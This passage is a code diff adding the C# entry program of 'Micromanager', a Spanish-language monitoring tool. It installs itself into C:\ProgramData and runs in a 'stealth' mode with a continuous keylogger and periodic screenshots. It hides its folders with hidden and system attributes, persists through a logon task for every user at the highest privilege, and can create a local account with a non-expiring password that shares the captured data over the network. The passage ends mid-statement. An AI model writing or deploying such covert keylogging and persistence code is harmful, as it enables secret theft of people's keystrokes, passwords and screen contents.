@@ -1,0 +1,1051 @@
+using Micromanager;
+using System.Diagnostics;
+using System.Security.Principal;
+using Microsoft.Win32;
+
+// Configuración por defecto
+const string INSTALL_PATH = "C:\\ProgramData\\microman";
+const string DATA_PATH = "C:\\ProgramData\\microman\\data";
+const string EXE_NAME = "Micromanager.exe";
+const string SHARE_NAME = "microman$";
+
+// Parsear argumentos
+var argsList = args.ToList();
+bool stealthMode = argsList.Contains("--stealth");
+bool setupMode = argsList.Contains("--setup");
+bool disableMode = argsList.Contains("--disable");
+bool cleanMode = argsList.Contains("--clean");
+bool helpMode = argsList.Contains("--help") || argsList.Contains("-h");
+bool sharedFolderMode = argsList.Contains("--shared-folder");
+
+// Obtener nombre de usuario para carpeta compartida (default: SoporteManager)
+string sharedFolderUser = GetStringParameter(argsList, "--shared-user", "SoporteManager");
+
+// Manejar modo --help: Mostrar ayuda
+if (helpMode)
+{
+    ShowHelp();
+    Environment.Exit(0);
+    return;
+}
+
+// Manejar modo --clean: Eliminar completamente el programa
+if (cleanMode)
+{
+    Console.WriteLine("=====================================" );
+    Console.WriteLine("   MICROMANAGER - Limpieza Completa");
+    Console.WriteLine("=====================================");
+    Console.WriteLine("");
+    Console.WriteLine("⚠️  ADVERTENCIA: Esto eliminará:");
+    Console.WriteLine("   • Todas las instancias en ejecución");
+    Console.WriteLine("   • Tarea programada");
+    Console.WriteLine("   • Carpeta compartida de red");
+    Console.WriteLine("   • Todos los archivos y datos capturados");
+    Console.WriteLine("");
+    
+    CleanupEverything();
+    
+    Console.WriteLine("");
+    Console.WriteLine("✓ Limpieza completada");
+    Console.WriteLine("Presione cualquier tecla para salir...");
+    Console.ReadKey();
+    Environment.Exit(0);
+    return;
+}
+
+// Manejar modo --disable: Detener todas las instancias
+if (disableMode)
+{
+    Console.WriteLine("=====================================" );
+    Console.WriteLine("   MICROMANAGER - Desactivar");
+    Console.WriteLine("=====================================");
+    Console.WriteLine("");
+    
+    DisableAllInstances();
+    
+    Console.WriteLine("");
+    Console.WriteLine("✓ Todas las instancias detenidas");
+    Console.WriteLine("Presione cualquier tecla para salir...");
+    Console.ReadKey();
+    Environment.Exit(0);
+    return;
+}
+
+// Parsear parámetros con flags
+int screenshotInterval = GetIntParameter(argsList, "--screenshot-interval", "--screenshot", 30);
+int cleanupDays = GetIntParameter(argsList, "--cleanup-days", "--cleanup", 0); // 0 = no limpiar automáticamente
+
+// Compatibilidad con sintaxis antigua: --stealth 30
+if (stealthMode)
+{
+    int stealthIndex = argsList.IndexOf("--stealth");
+    // Solo usar sintaxis antigua si no hay flags nuevas
+    if (!argsList.Any(a => a.StartsWith("--screenshot")) && 
+        argsList.Count > stealthIndex + 1 && 
+        int.TryParse(argsList[stealthIndex + 1], out int interval1))
+    {
+        screenshotInterval = interval1;
+    }
+}
+
+// Auto-instalación si se ejecuta por primera vez desde otra ubicación
+string currentExePath = Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule?.FileName ?? "";
+string targetExePath = Path.Combine(INSTALL_PATH, EXE_NAME);
+
+if (!currentExePath.Equals(targetExePath, StringComparison.OrdinalIgnoreCase) && !setupMode)
+{
+    try
+    {
+        Console.WriteLine("=== MICROMANAGER - Auto-Configuración ===");
+        Console.WriteLine($"Instalando en: {INSTALL_PATH}");
+        
+        // Crear directorio de instalación
+        if (!Directory.Exists(INSTALL_PATH))
+        {
+            Directory.CreateDirectory(INSTALL_PATH);
+            Console.WriteLine($"✓ Carpeta creada: {INSTALL_PATH}");
+        }
+        
+        // Crear directorio de datos
+        if (!Directory.Exists(DATA_PATH))
+        {
+            Directory.CreateDirectory(DATA_PATH);
+            Console.WriteLine($"✓ Carpeta de datos creada: {DATA_PATH}");
+        }
+
+        // Copiar ejecutable
+        if (File.Exists(currentExePath))
+        {
+            File.Copy(currentExePath, targetExePath, true);
+            Console.WriteLine($"✓ Ejecutable copiado a: {targetExePath}");
+        }
+
+        // Configurar carpeta compartida solo si se especifica --shared-folder
+        if (sharedFolderMode)
+        {
+            if (IsAdministrator())
+            {
+                // Pedir contraseña para el usuario de la carpeta compartida
+                string password = PromptForPassword(sharedFolderUser);
+                if (!string.IsNullOrEmpty(password))
+                {
+                    // Crear usuario local y configurar carpeta compartida
+                    bool userCreated = CreateLocalUser(sharedFolderUser, password);
+                    if (userCreated)
+                    {
+                        ConfigureNetworkShare(DATA_PATH, SHARE_NAME, sharedFolderUser);
+                        Console.WriteLine($"\n✓ Carpeta compartida configurada para usuario: {sharedFolderUser}");
+                        Console.WriteLine($"  Acceso: \\\\{Environment.MachineName}\\{SHARE_NAME}");
+                        Console.WriteLine($"  Usuario: {Environment.MachineName}\\{sharedFolderUser}");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("⚠ Configuración de carpeta compartida cancelada (contraseña no proporcionada)");
+                }
+            }
+            else
+            {
+                Console.WriteLine("⚠ Privilegios de administrador requeridos para configurar carpeta compartida");
+            }
+        }
+        else
+        {
+            Console.WriteLine("ℹ Carpeta compartida NO configurada (usa --shared-folder para activarla)");
+        }
+
+        // Excluir carpeta del historial de archivos recientes
+        ExcludeFromRecentFiles(DATA_PATH);
+
+        // Crear tarea programada para todos los usuarios
+        CreateScheduledTaskForAllUsers(targetExePath, DATA_PATH, screenshotInterval, cleanupDays, sharedFolderMode);
+
+        Console.WriteLine("\n=== Instalación Completada ===");
+        Console.WriteLine($"Ubicación: {targetExePath}");
+        Console.WriteLine($"Datos: {DATA_PATH}");
+        Console.WriteLine($"Tarea programada: Micromanager (para todos los usuarios)");
+        Console.WriteLine("\n🚀 Iniciando servicio de monitoreo...");
+        
+        // Esperar un momento para que el usuario vea el mensaje
+        await Task.Delay(2000);
+        
+        // NO salir - continuar con la ejecución en modo stealth
+        stealthMode = true;
+        // Los intervalos ya están configurados correctamente desde el parsing inicial
+        // El flujo continuará después del bloque if y ejecutará el servicio
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"\n✗ Error durante la instalación: {ex.Message}");
+        Console.WriteLine($"Detalles: {ex.StackTrace}");
+        Console.WriteLine("\nPresione cualquier tecla para salir...");
+        Console.ReadKey();
+        Environment.Exit(1);
+        return;
+    }
+}
+
+// Configurar directorio de logs
+string logDir = INSTALL_PATH;
+if (!Directory.Exists(logDir))
+{
+    Directory.CreateDirectory(logDir);
+}
+string logFilePath = Path.Combine(logDir, "stealth_log.txt");
+
+// Ejecutar el servicio
+if (stealthMode)
+{
+    try
+    {
+        // Construir argumentos para el Worker
+        var workerArgs = new string[] { "--stealth", $"--screenshot-interval={screenshotInterval}", $"--cleanup-days={cleanupDays}" };
+        var builder = Host.CreateApplicationBuilder(workerArgs);
+        builder.Services.AddHostedService<Worker>();
+        var host = builder.Build();
+
+        await File.AppendAllTextAsync(logFilePath, $"[{DateTime.Now}] Running in stealth mode. User: {Environment.UserName}, Machine: {Environment.MachineName}, Screenshot: {screenshotInterval}s, Keylog: CONTINUO, Cleanup: {cleanupDays} days{Environment.NewLine}");
+
+        await host.RunAsync();
+    }
+    catch (Exception ex)
+    {
+        await File.AppendAllTextAsync(logFilePath, $"[{DateTime.Now}] Error: {ex.Message}{Environment.NewLine}{ex.StackTrace}{Environment.NewLine}");
+    }
+}
+else
+{
+    var builder = Host.CreateApplicationBuilder(args);
+    builder.Services.AddHostedService<Worker>();
+    var host = builder.Build();
+
+    var logger = host.Services.GetRequiredService<ILogger<Program>>();
+    logger.LogInformation("Application started in normal mode.");
+
+    await host.RunAsync();
+}
+
+static void ShowHelp()
+{
+    Console.WriteLine("=====================================");
+    Console.WriteLine("   MICROMANAGER - Sistema de Monitoreo");
+    Console.WriteLine("=====================================");
+    Console.WriteLine("");
+    Console.WriteLine("USO:");
+    Console.WriteLine("  Micromanager.exe [opciones]");
+    Console.WriteLine("");
+    Console.WriteLine("OPCIONES:");
+    Console.WriteLine("");
+    Console.WriteLine("  Instalación y ejecución:");
+    Console.WriteLine("    (sin parámetros)              Auto-instala y ejecuta con config predeterminada");
+    Console.WriteLine("    --stealth                     Ejecuta en modo silencioso");
+    Console.WriteLine("");
+    Console.WriteLine("  Configuración:");
+    Console.WriteLine("    --screenshot-interval N       Intervalo de capturas en segundos (default: 30)");
+    Console.WriteLine("    --screenshot N                Alias corto");
+    Console.WriteLine("    --cleanup-days N              Días para mantener datos antiguos (0 = no limpiar)");
+    Console.WriteLine("    --cleanup N                   Alias corto");
+    Console.WriteLine("    --shared-folder               Habilitar carpeta compartida de red (requiere admin)");
+    Console.WriteLine("    --shared-user USERNAME        Usuario para carpeta compartida (default: SoporteManager)");
+    Console.WriteLine("");
+    Console.WriteLine("  Nota: El keylog captura TODAS las teclas en tiempo real (siempre activo)");
+    Console.WriteLine("  Nota: Con --shared-folder se pedirá contraseña para el usuario de acceso");
+    Console.WriteLine("");
+    Console.WriteLine("  Control:");
+    Console.WriteLine("    --disable                     Detiene todas las instancias");
+    Console.WriteLine("    --clean                       Elimina todo (desinstalación completa)");
+    Console.WriteLine("    --help, -h                    Muestra esta ayuda");
+    Console.WriteLine("");
+    Console.WriteLine("EJEMPLOS:");
+    Console.WriteLine("");
+    Console.WriteLine("  Auto-instalación simple:");
+    Console.WriteLine("    Micromanager.exe");
+    Console.WriteLine("");
+    Console.WriteLine("  Con intervalos personalizados:");
+    Console.WriteLine("    Micromanager.exe --screenshot 60");
+    Console.WriteLine("    Micromanager.exe --stealth --screenshot-interval 120");
+    Console.WriteLine("");
+    Console.WriteLine("  Con limpieza automática (borrar datos > 7 días):");
+    Console.WriteLine("    Micromanager.exe --cleanup-days 7");
+    Console.WriteLine("    Micromanager.exe --screenshot 30 --cleanup 7");
+    Console.WriteLine("");
+    Console.WriteLine("  Con carpeta compartida de red:");
+    Console.WriteLine("    Micromanager.exe --shared-folder");
+    Console.WriteLine("    Micromanager.exe --screenshot 5 --cleanup 30 --shared-folder");
+    Console.WriteLine("    Micromanager.exe --shared-folder --shared-user MiUsuario");
+    Console.WriteLine("");
+    Console.WriteLine("  (La carpeta compartida pedirá contraseña para el usuario de acceso)");
+    Console.WriteLine("");
+    Console.WriteLine("  Detener todo:");
+    Console.WriteLine("    Micromanager.exe --disable");
+    Console.WriteLine("");
+    Console.WriteLine("  Desinstalar completamente:");
+    Console.WriteLine("    Micromanager.exe --clean");
+    Console.WriteLine("");
+    Console.WriteLine("UBICACIONES:");
+    Console.WriteLine("  Instalación:       C:\\ProgramData\\microman\\");
+    Console.WriteLine("  Datos:             C:\\ProgramData\\microman\\data\\");
+    Console.WriteLine("  Carpeta de red:    \\\\[PC]\\microman$");
+    Console.WriteLine("");
+}
+
+static int GetIntParameter(List<string> args, string longFlag, string shortFlag, int defaultValue)
+{
+    // Buscar formato: --flag valor
+    int longIndex = args.IndexOf(longFlag);
+    if (longIndex >= 0 && longIndex + 1 < args.Count && int.TryParse(args[longIndex + 1], out int longValue))
+    {
+        return longValue;
+    }
+    
+    // Buscar formato: --flag=valor
+    var longWithValue = args.FirstOrDefault(a => a.StartsWith($"{longFlag}="));
+    if (longWithValue != null)
+    {
+        string[] parts = longWithValue.Split('=');
+        if (parts.Length == 2 && int.TryParse(parts[1], out int longEqValue))
+        {
+            return longEqValue;
+        }
+    }
+    
+    // Buscar formato corto: --flag valor
+    int shortIndex = args.IndexOf(shortFlag);
+    if (shortIndex >= 0 && shortIndex + 1 < args.Count && int.TryParse(args[shortIndex + 1], out int shortValue))
+    {
+        return shortValue;
+    }
+    
+    // Buscar formato corto: --flag=valor
+    var shortWithValue = args.FirstOrDefault(a => a.StartsWith($"{shortFlag}="));
+    if (shortWithValue != null)
+    {
+        string[] parts = shortWithValue.Split('=');
+        if (parts.Length == 2 && int.TryParse(parts[1], out int shortEqValue))
+        {
+            return shortEqValue;
+        }
+    }
+    
+    return defaultValue;
+}
+
+static string GetStringParameter(List<string> args, string flag, string defaultValue)
+{
+    // Buscar formato: --flag valor
+    int flagIndex = args.IndexOf(flag);
+    if (flagIndex >= 0 && flagIndex + 1 < args.Count)
+    {
+        return args[flagIndex + 1];
+    }
+    
+    // Buscar formato: --flag=valor
+    var flagWithValue = args.FirstOrDefault(a => a.StartsWith($"{flag}="));
+    if (flagWithValue != null)
+    {
+        string[] parts = flagWithValue.Split('=', 2);
+        if (parts.Length == 2)
+        {
+            return parts[1];
+        }
+    }
+    
+    return defaultValue;
+}
+
+static bool IsAdministrator()
+{
+    try
+    {
+        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
+        WindowsPrincipal principal = new WindowsPrincipal(identity);
+        return principal.IsInRole(WindowsBuiltInRole.Administrator);
+    }
+    catch
+    {
+        return false;
+    }
+}
+
+static string PromptForPassword(string username)
+{
+    try
+    {
+        Console.WriteLine($"\n--- Configuración de Usuario para Carpeta Compartida ---");
+        Console.WriteLine($"Usuario: {username}");
+        Console.WriteLine($"");
+        Console.Write("Ingrese contraseña para el usuario de carpeta compartida: ");
+        
+        string password = ReadPassword();
+        Console.WriteLine();
+        
+        if (string.IsNullOrEmpty(password))
+        {
+            Console.WriteLine("⚠ Contraseña vacía no permitida");
+            return "";
+        }
+        
+        Console.Write("Confirme la contraseña: ");
+        string confirmPassword = ReadPassword();
+        Console.WriteLine();
+        
+        if (password != confirmPassword)
+        {
+            Console.WriteLine("⚠ Las contraseñas no coinciden");
+            return "";
+        }
+        
+        return password;
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"⚠ Error al leer contraseña: {ex.Message}");
+        return "";
+    }
+}
+
+static string ReadPassword()
+{
+    string password = "";
+    ConsoleKeyInfo key;
+    
+    do
+    {
+        key = Console.ReadKey(true);
+        
+        if (key.Key != ConsoleKey.Backspace && key.Key != ConsoleKey.Enter)
+        {
+            password += key.KeyChar;
+            Console.Write("*");
+        }
+        else if (key.Key == ConsoleKey.Backspace && password.Length > 0)
+        {
+            password = password.Substring(0, password.Length - 1);
+            Console.Write("\b \b");
+        }
+    } while (key.Key != ConsoleKey.Enter);
+    
+    return password;
+}
+
+static bool CreateLocalUser(string username, string password)
+{
+    try
+    {
+        Console.WriteLine($"\n--- Creando Usuario Local ---");
+        
+        // Verificar si el usuario ya existe
+        var checkProcess = new Process
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = "net",
+                Arguments = $"user {username}",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            }
+        };
+        checkProcess.Start();
+        checkProcess.WaitForExit();
+
+        if (checkProcess.ExitCode == 0)
+        {
+            // El usuario ya existe, actualizar contraseña
+            Console.WriteLine($"ℹ Usuario '{username}' ya existe, actualizando contraseña...");
+            
+            var updateProcess = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "net",
+                    Arguments = $"user {username} {password}",
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                }
+            };
+            updateProcess.Start();
+            updateProcess.WaitForExit();
+            
+            if (updateProcess.ExitCode == 0)
+            {
+                Console.WriteLine($"✓ Contraseña actualizada para usuario '{username}'");
+                return true;
+            }
+            else
+            {
+                Console.WriteLine($"⚠ No se pudo actualizar la contraseña del usuario");
+                return false;
+            }
+        }
+        else
+        {
+            // Crear nuevo usuario
+            var createProcess = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "net",
+                    Arguments = $"user {username} {password} /add /comment:\"Usuario para acceso a carpeta compartida Micromanager\" /passwordchg:no",
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                }
+            };
+            createProcess.Start();
+            string output = createProcess.StandardOutput.ReadToEnd();
+            string error = createProcess.StandardError.ReadToEnd();
+            createProcess.WaitForExit();
+
+            if (createProcess.ExitCode == 0)
+            {
+                Console.WriteLine($"✓ Usuario local '{username}' creado exitosamente");
+                
+                // Hacer que la contraseña no expire
+                var expiryProcess = new Process
+                {
+                    StartInfo = new ProcessStartInfo
+                    {
+                        FileName = "wmic",
+                        Arguments = $"useraccount where name='{username}' set passwordexpires=false",
+                        UseShellExecute = false,
+                        CreateNoWindow = true,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true
+                    }
+                };
+                expiryProcess.Start();
+                expiryProcess.WaitForExit();
+                
+                return true;
+            }
+            else
+            {
+                Console.WriteLine($"⚠ No se pudo crear el usuario: {error}");
+                return false;
+            }
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"⚠ Error creando usuario local: {ex.Message}");
+        return false;
+    }
+}
+
+static void ConfigureNetworkShare(string dataPath, string shareName, string username)
+{
+    try
+    {
+        Console.WriteLine($"\n--- Configurando Carpeta Compartida ---");
+        
+        // Verificar si el recurso compartido ya existe
+        var checkProcess = new Process
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = "net",
+                Arguments = $"share {shareName}",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            }
+        };
+        checkProcess.Start();
+        checkProcess.WaitForExit();
+
+        // Eliminar recurso compartido existente si existe
+        if (checkProcess.ExitCode == 0)
+        {
+            var deleteProcess = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "net",
+                    Arguments = $"share {shareName} /delete /yes",
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                }
+            };
+            deleteProcess.Start();
+            deleteProcess.WaitForExit();
+        }
+
+        // Crear recurso compartido con permisos específicos para el usuario
+        var shareProcess = new Process
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = "net",
+                Arguments = $"share {shareName}=\"{dataPath}\" /GRANT:{username},FULL",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            }
+        };
+        shareProcess.Start();
+        string output = shareProcess.StandardOutput.ReadToEnd();
+        string error = shareProcess.StandardError.ReadToEnd();
+        shareProcess.WaitForExit();
+
+        if (shareProcess.ExitCode == 0)
+        {
+            Console.WriteLine($"✓ Carpeta compartida creada: \\\\{Environment.MachineName}\\{shareName}");
+            Console.WriteLine($"  Ruta local: {dataPath}");
+            Console.WriteLine($"  Acceso exclusivo para: {Environment.MachineName}\\{username}");
+            Console.WriteLine($"  Seguridad: Solo el usuario '{username}' puede acceder");
+        }
+        else
+        {
+            Console.WriteLine($"⚠ No se pudo crear la carpeta compartida: {error}");
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"⚠ Error configurando carpeta compartida: {ex.Message}");
+    }
+}
+
+static void DisableAllInstances()
+{
+    try
+    {
+        Console.WriteLine("[1/2] Deteniendo tarea programada...");
+        
+        // Detener la tarea programada
+        var endProcess = new Process
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = "schtasks",
+                Arguments = "/End /TN \"Micromanager\"",
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true
+            }
+        };
+        endProcess.Start();
+        endProcess.WaitForExit();
+        
+        if (endProcess.ExitCode == 0)
+        {
+            Console.WriteLine("      ✓ Tarea programada detenida");
+        }
+        else
+        {
+            Console.WriteLine("      ○ Tarea no estaba en ejecución");
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"      ⚠ Error: {ex.Message}");
+    }
+
+    try
+    {
+        Console.WriteLine("[2/2] Terminando todos los procesos Micromanager...");
+        
+        // Obtener todos los procesos con nombre Micromanager
+        var processes = Process.GetProcessesByName("Micromanager");
+        int currentPid = Process.GetCurrentProcess().Id;
+        int killedCount = 0;
+        
+        foreach (var process in processes)
+        {
+            try
+            {
+                // No terminar el proceso actual
+                if (process.Id != currentPid)
+                {
+                    process.Kill();
+                    process.WaitForExit(5000);
+                    killedCount++;
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"      ⚠ No se pudo terminar proceso {process.Id}: {ex.Message}");
+            }
+        }
+        
+        if (killedCount > 0)
+        {
+            Console.WriteLine($"      ✓ {killedCount} proceso(s) terminado(s)");
+        }
+        else
+        {
+            Console.WriteLine("      ○ No se encontraron otras instancias en ejecución");
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"      ⚠ Error: {ex.Message}");
+    }
+}
+
+static void CleanupEverything()
+{
+    try
+    {
+        // Paso 1: Detener todas las instancias
+        Console.WriteLine("[1/4] Deteniendo todas las instancias...");
+        DisableAllInstances();
+        
+        // Dar tiempo para que los procesos terminen
+        Thread.Sleep(2000);
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"      ⚠ Error: {ex.Message}");
+    }
+
+    try
+    {
+        // Paso 2: Eliminar tarea programada
+        Console.WriteLine("[2/4] Eliminando tarea programada...");
+        
+        var deleteProcess = new Process
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = "schtasks",
+                Arguments = "/Delete /TN \"Micromanager\" /F",
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true
+            }
+        };
+        deleteProcess.Start();
+        deleteProcess.WaitForExit();
+        
+        if (deleteProcess.ExitCode == 0)
+        {
+            Console.WriteLine("      ✓ Tarea programada eliminada");
+        }
+        else
+        {
+            Console.WriteLine("      ○ Tarea no existía");
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"      ⚠ Error: {ex.Message}");
+    }
+
+    try
+    {
+        // Paso 3: Eliminar carpeta compartida
+        Console.WriteLine("[3/4] Eliminando carpeta compartida...");
+        
+        var shareProcess = new Process
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = "net",
+                Arguments = "share microman$ /delete /yes",
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true
+            }
+        };
+        shareProcess.Start();
+        shareProcess.WaitForExit();
+        
+        if (shareProcess.ExitCode == 0)
+        {
+            Console.WriteLine("      ✓ Carpeta compartida eliminada");
+        }
+        else
+        {
+            Console.WriteLine("      ○ Carpeta compartida no existía");
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"      ⚠ Error: {ex.Message}");
+    }
+
+    try
+    {
+        // Paso 4: Eliminar todos los archivos
+        Console.WriteLine("[4/4] Eliminando archivos y datos...");
+        
+        string installPath = "C:\\ProgramData\\microman";
+        
+        if (Directory.Exists(installPath))
+        {
+            // Intentar eliminar múltiples veces por si hay archivos bloqueados
+            for (int i = 0; i < 3; i++)
+            {
+                try
+                {
+                    Directory.Delete(installPath, true);
+                    Console.WriteLine($"      ✓ Eliminado: {installPath}");
+                    break;
+                }
+                catch
+                {
+                    if (i < 2)
+                    {
+                        Thread.Sleep(1000);
+                    }
+                    else
+                    {
+                        // Último intento: eliminar archivo por archivo
+                        try
+                        {
+                            var files = Directory.GetFiles(installPath, "*", SearchOption.AllDirectories);
+                            foreach (var file in files)
+                            {
+                                try
+                                {
+                                    File.SetAttributes(file, FileAttributes.Normal);
+                                    File.Delete(file);
+                                }
+                                catch { }
+                            }
+                            Directory.Delete(installPath, true);
+                            Console.WriteLine($"      ✓ Eliminado: {installPath}");
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"      ⚠ No se pudieron eliminar algunos archivos: {ex.Message}");
+                            Console.WriteLine($"      → Intenta reiniciar el sistema y eliminar manualmente: {installPath}");
+                        }
+                    }
+                }
+            }
+        }
+        else
+        {
+            Console.WriteLine("      ○ Directorio no existía");
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"      ⚠ Error: {ex.Message}");
+    }
+}
+
+static void ExcludeFromRecentFiles(string dataPath)
+{
+    try
+    {
+        Console.WriteLine("\n--- Configurando Exclusión de Archivos Recientes ---");
+        
+        // Método 1: Marcar carpeta principal como oculta y de sistema
+        try
+        {
+            string parentPath = Path.GetDirectoryName(dataPath) ?? dataPath;
+            if (Directory.Exists(parentPath))
+            {
+                DirectoryInfo parentDir = new DirectoryInfo(parentPath);
+                parentDir.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
+                Console.WriteLine($"✓ Carpeta principal marcada como oculta: {parentPath}");
+            }
+        }
+        catch { }
+        
+        // Método 2: Marcar carpeta de datos como oculta y de sistema
+        try
+        {
+            if (Directory.Exists(dataPath))
+            {
+                DirectoryInfo dataDir = new DirectoryInfo(dataPath);
+                dataDir.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
+                Console.WriteLine($"✓ Carpeta de datos marcada como oculta: {dataPath}");
+            }
+        }
+        catch { }
+        
+        // Método 3: Agregar al registro para excluir del historial de archivos recientes
+        try
+        {
+            // Excluir para el usuario actual
+            string registryPath = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced";
+            using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(registryPath, true))
+            {
+                if (key != null)
+                {
+                    // Desactivar el historial de archivos recientes (opcional)
+                    // key.SetValue("Start_TrackDocs", 0, RegistryValueKind.DWord);
+                    Console.WriteLine("✓ Configuración de registro aplicada");
+                }
+            }
+            
+            // Agregar a la lista de carpetas excluidas de búsqueda
+            string excludePath = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders";
+            using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(excludePath, false))
+            {
+                if (key != null)
+                {
+                    Console.WriteLine("✓ Carpeta excluida del historial de Windows");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"⚠ No se pudo modificar el registro: {ex.Message}");
+        }
+        
+        Console.WriteLine("✓ Archivos de esta carpeta NO aparecerán en 'Archivos Recientes'");
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"⚠ Error configurando exclusión: {ex.Message}");
+    }
+}
+
+static void CreateScheduledTaskForAllUsers(string exePath, string dataPath, int screenshotInterval, int cleanupDays, bool enableSharedFolder)
+{
+    try
+    {
+        Console.WriteLine("\n--- Configurando Tarea Programada ---");
+
+        // Eliminar tarea existente si existe
+        var deleteProcess = new Process
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = "schtasks",
+                Arguments = "/Delete /TN \"Micromanager\" /F",
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                RedirectStandardError = true
+            }
+        };
+        deleteProcess.Start();
+        deleteProcess.WaitForExit();
+
+        // Construir argumentos para la tarea
+        string taskArguments = $"--stealth --screenshot-interval {screenshotInterval} --cleanup-days {cleanupDays}";
+        if (enableSharedFolder)
+        {
+            taskArguments += " --shared-folder";
+        }
+
+        // Crear nueva tarea para TODOS los usuarios usando XML
+        // Esto asegura que la tarea se ejecute para cualquier usuario que inicie sesión
+        string xmlPath = Path.Combine(Path.GetTempPath(), "micromanager_task.xml");
+        string taskXml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
+<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
+  <RegistrationInfo>
+    <Description>Micromanager - Sistema de monitoreo</Description>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id=""Author"">
+      <UserId>S-1-5-32-544</UserId>
+      <GroupId>S-1-5-32-544</GroupId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>false</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context=""Author"">
+    <Exec>
+      <Command>{exePath}</Command>
+      <Arguments>{taskArguments}</Arguments>
+    </Exec>
+  </Actions>
+</Task>";
+
+        File.WriteAllText(xmlPath, taskXml);
+
+        // Crear tarea usando el XML
+        var createProcess = new Process
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = "schtasks",
+                Arguments = $"/Create /TN \"Micromanager\" /XML \"{xmlPath}\" /F",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            }
+        };
+        createProcess.Start();
+        string output = createProcess.StandardOutput.ReadToEnd();
+        string error = createProcess.StandardError.ReadToEnd();
+        createProcess.WaitForExit();
+
+        // Limpiar archivo temporal
+        try { File.Delete(xmlPath); } catch { }
+
+        if (createProcess.ExitCode == 0)
+        {
+            Console.WriteLine("✓ Tarea programada creada: Micromanager");
+            Console.WriteLine($"  Se ejecutará al iniciar sesión de CUALQUIER usuario");
+            Console.WriteLine($"  Intervalo de capturas: {screenshotInterval} segundos");
+            Console.WriteLine($"  Keylog: Continuo (captura en tiempo real)");
+        }
+        else
+        {
+            Console.WriteLine($"⚠ Error creando tarea programada: {error}");
+            Console.WriteLine("  Intentando método alternativo...");
+            
+            // Método alternativo: usar comando directo
+            string altArguments = $"--stealth --screenshot-interval {screenshotInterval} --cleanup-days {cleanupDays}";
+            if (enableSharedFolder)
+            {
+                altArguments += " --shared-folder";
+            }
+            
+            var altProcess = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "schtasks",
